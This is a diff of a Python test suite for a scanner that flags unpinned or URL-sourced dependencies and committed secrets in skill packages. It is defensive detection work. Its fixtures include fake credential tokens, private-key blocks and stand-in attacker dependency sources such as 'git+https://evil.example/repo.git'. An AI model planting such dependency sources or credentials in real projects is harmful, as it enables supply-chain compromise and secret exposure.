@@ -9,8 +9,11 @@ secret, and a fenced example is demoted (not dropped) only in the markdown lane.
 
 from __future__ import annotations
 
+import json
+
 from skill_xray import ingest, parse
 from skill_xray.checks.supply_chain import check
+from skill_xray.findings import FINDING_CAP
 
 _M = "---\nname: t\n---\n"
 
@@ -33,7 +36,7 @@ def test_requirements_unpinned_fires_pinned_is_silent(make_package):
     f = _by_vector(_check(make_package, {"requirements.txt": req}), "SXV-016")
     assert len(f) == 1
     only = f[0]
-    assert only.severity == "low" and only.line == 1
+    assert only.severity == "low" and only.line == 2
     assert only.evidence == {"ecosystem": "PyPI", "package": "flask",
                              "pin_state": "unpinned"}
 
@@ -89,6 +92,8 @@ def test_each_real_credential_shape_fires(make_package):
             "goog = '%s'\n"
             "stripe = '%s'\n"
             "-----BEGIN RSA PRIVATE KEY-----\n"
+            "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n"
+            "-----END RSA PRIVATE KEY-----\n"
             % (_AWS, _GHP, _SLACK, _AIZA, _STRIPE))
     f = _by_vector(_check(make_package, {"scripts/x.py": body}), "SXV-017")
     rules = {x.evidence["rule"] for x in f}
@@ -124,13 +129,11 @@ def test_git_sha_is_not_a_secret(make_package):
     assert _by_vector(_check(make_package, {"scripts/x.py": body}), "SXV-017") == []
 
 
-def test_truncated_pattern_example_is_suppressed(make_package):
-    # a credential-shaped token written as a truncated reference example (`xoxb-...abc...`, a
-    # secret-pattern table or a security-audit checklist) is not a live secret; the same token
-    # written whole still fires.
+def test_ellipsis_cannot_suppress_a_complete_credential_shape(make_package):
+    # Punctuation after a complete credential is attacker-controlled and cannot suppress it.
     for doc in ("| Slack | `xoxb-` | `xoxb-123-456-abcdefghij...` |\n",
                 "look for a github token like ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8 ...\n"):
-        assert _by_vector(_check(make_package, {"PATTERNS.md": doc}), "SXV-017") == [], doc
+        assert _by_vector(_check(make_package, {"PATTERNS.md": doc}), "SXV-017"), doc
     real = "TOKEN = 'xoxb-123-456-abcdefghij'\n"
     assert _by_vector(_check(make_package, {"config.py": real}), "SXV-017")
 
@@ -164,6 +167,21 @@ def test_encrypted_and_dsa_private_keys_fire(make_package):
         pem = "-----BEGIN %s-----\nMIIBODUMMYINERTBODY\n-----END %s-----\n" % (label, label)
         f = _check(make_package, {"server.pem": pem})
         assert "SXV-017" in {x.vector for x in f}, label
+
+
+def test_private_key_header_requires_a_complete_block(make_package):
+    header_only = "-----BEGIN PRIVATE KEY-----\nnot a key\n"
+    assert not _by_vector(_check(make_package, {"README.txt": header_only}), "SXV-017")
+
+    complete = (
+        "-----BEGIN PRIVATE KEY-----\n"
+        "Proc-Type: 4,ENCRYPTED\n"
+        "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n"
+        "-----END PRIVATE KEY-----\n"
+    )
+    findings = _by_vector(_check(make_package, {"secret.pem": complete}), "SXV-017")
+    assert len(findings) == 1
+    assert findings[0].evidence["rule"] == "private-key"
 
 
 def test_github_published_example_token_is_not_a_leak(make_package):
@@ -301,6 +319,121 @@ def test_slack_placeholder_and_prose_are_not_leaks_but_real_token_fires(make_pac
     assert "SXV-017" in {f.vector for f in _check(make_package, {"config.py": real})}
 
 
+def test_placeholder_words_inside_opaque_credentials_do_not_suppress(make_package):
+    tokens = (
+        "ghp_" + "a" * 32 + "here",
+        "AIza" + "B" * 29 + "sample",
+        "npm_" + "a" * 31 + "dummy",
+    )
+    findings = _by_vector(
+        _check(make_package, {"config.py": "\n".join(tokens)}), "SXV-017"
+    )
+    assert len(findings) == len(tokens)
+
+
+def test_indented_code_does_not_demote_following_prose_secret(make_package):
+    guide = "    example command\n\nThe live key is %s\n" % _AWS
+    findings = _by_vector(_check(make_package, {"GUIDE.md": guide}), "SXV-017")
+    assert len(findings) == 1
+    assert findings[0].severity == "high"
+    assert findings[0].evidence["fenced_example"] is False
+
+
+def test_tilde_crlf_and_unclosed_fences_keep_exact_secret_context(make_package):
+    guide = "~~~text\r\n%s\r\n~~~\r\n%s\r\n" % (_AWS, _GHP)
+    findings = _by_vector(_check(make_package, {"GUIDE.md": guide}), "SXV-017")
+    by_rule = {finding.evidence["rule"]: finding for finding in findings}
+    assert by_rule["aws-access-key-id"].severity == "medium"
+    assert by_rule["github-pat"].severity == "high"
+
+    unclosed = "```text\n%s\n" % _AWS
+    finding = _by_vector(_check(make_package, {"GUIDE.md": unclosed}), "SXV-017")[0]
+    assert finding.severity == "medium"
+
+
+def test_npm_scp_git_source_is_medium_direct_install(make_package):
+    pkg = '{"dependencies":{"plugin":"git@github.com:attacker/plugin.git#main"}}'
+    findings = _by_vector(_check(make_package, {"package.json": pkg}), "SXV-016")
+    assert len(findings) == 1
+    assert findings[0].rule == "install-from-url"
+    assert findings[0].severity == "medium"
+
+
+def test_direct_install_url_credentials_are_redacted(make_package):
+    req = "pkg @ https://user:super-secret@example.com/pkg.whl?token=query-secret#fragment\n"
+    finding = _by_vector(_check(make_package, {"requirements.txt": req}), "SXV-016")[0]
+    rendered = finding.message + repr(finding.evidence)
+    assert "super-secret" not in rendered
+    assert "query-secret" not in rendered
+    assert "user:" not in rendered
+
+
+def test_direct_install_path_credentials_are_redacted(make_package):
+    token = "ghp_" + "z" * 36
+    req = "pkg @ https://host/%s/pkg.whl\n" % token
+    finding = _by_vector(_check(make_package, {"requirements.txt": req}), "SXV-016")[0]
+    assert token not in finding.message + repr(finding.evidence)
+
+
+def test_malformed_direct_url_still_redacts_all_opaque_values(make_package):
+    req = "pkg @ https://user:secret@[bad/pkg.whl?token=query-secret#fragment\n"
+    finding = _by_vector(_check(make_package, {"requirements.txt": req}), "SXV-016")[0]
+    rendered = finding.message + repr(finding.evidence)
+    assert "secret" not in rendered
+    assert "query-secret" not in rendered
+    assert "fragment" not in rendered
+
+
+def test_bare_url_does_not_use_credentials_as_dependency_name(make_package):
+    req = "https://user:secret@example.com/pkg.whl\n"
+    finding = _by_vector(_check(make_package, {"requirements.txt": req}), "SXV-016")[0]
+    assert "Dependency `dependency`" in finding.message
+    assert "user" not in finding.message and "secret" not in finding.message
+
+
+def test_distinct_pyproject_dependencies_sharing_url_are_both_reported(make_package):
+    toml = ('[project]\nname = "x"\nversion = "1"\n'
+            'dependencies = ["a @ https://host/shared.whl", '
+            '"b @ https://host/shared.whl"]\n')
+    findings = _by_vector(_check(make_package, {"pyproject.toml": toml}), "SXV-016")
+    assert len(findings) == 2
+    assert any("Dependency `a`" in finding.message for finding in findings)
+    assert any("Dependency `b`" in finding.message for finding in findings)
+
+
+def test_physical_and_continued_dependencies_sharing_url_are_not_conflated(make_package):
+    req = ("a @ https://host/shared.whl\n"
+           "b @ https\\\n://host/shared.whl\n")
+    findings = _by_vector(_check(make_package, {"requirements.txt": req}), "SXV-016")
+    assert len(findings) == 2
+    assert any("Dependency `a`" in finding.message for finding in findings)
+    assert any("Dependency `b`" in finding.message for finding in findings)
+
+
+def test_google_key_may_end_in_hyphen_but_not_continue(make_package):
+    valid = "AIza" + "A" * 34 + "-"
+    findings = _by_vector(_check(make_package, {"config.py": "KEY = '%s'\n" % valid}),
+                          "SXV-017")
+    assert len(findings) == 1 and findings[0].evidence["rule"] == "google-api-key"
+    assert not _by_vector(
+        _check(make_package, {"config.py": "KEY = '%sA'\n" % valid}), "SXV-017"
+    )
+
+
+def test_agent_identity_fence_demotes_secret(make_package):
+    findings = _by_vector(
+        _check(make_package, {"CLAUDE.md": "```text\n%s\n```\n" % _AWS}), "SXV-017"
+    )
+    assert len(findings) == 1 and findings[0].severity == "medium"
+
+
+def test_committed_credentials_are_capped_per_file(make_package):
+    body = "\n".join("ghp_%036d" % index for index in range(FINDING_CAP + 3))
+    findings = _check(make_package, {"secrets.txt": body})
+    assert len(_by_vector(findings, "SXV-017")) == FINDING_CAP
+    assert len([finding for finding in findings if finding.rule == "findings-capped"]) == 1
+
+
 def test_pyproject_metadata_url_is_not_an_install_source(make_package):
     # a URL in a pyproject description / [project.urls] field is not a dependency.
     pyproj = ('[project]\nname = "x"\nversion = "1.0"\n'
@@ -335,6 +468,22 @@ def test_backslash_split_direct_ref_is_still_install_from_url(make_package):
     req = b"bar @ git+https\\\n://host/repo\n"             # pip joins to `bar @ git+https://host/repo`
     f = [x for x in _check(make_package, {"requirements.txt": req}) if x.vector == "SXV-016"]
     assert len(f) == 1 and f[0].rule == "install-from-url" and f[0].severity == "medium"
+
+
+def test_backslash_split_legacy_vcs_url_is_still_install_from_url(make_package):
+    req = b"git+https\\\n://evil.example/repo.git#egg=x\n"
+    findings = [x for x in _check(make_package, {"requirements.txt": req})
+                if x.vector == "SXV-016" and x.rule == "install-from-url"]
+    assert len(findings) == 1
+    assert findings[0].line == 1
+
+
+def test_dependency_findings_are_capped_per_file(make_package):
+    package = {"dependencies": {"dep-%d" % index: "*"
+                                for index in range(FINDING_CAP + 3)}}
+    findings = _check(make_package, {"package.json": json.dumps(package)})
+    assert len(_by_vector(findings, "SXV-016")) == FINDING_CAP
+    assert len([finding for finding in findings if finding.rule == "findings-capped"]) == 1
 
 
 def test_pip_option_line_is_not_a_dependency(make_package):
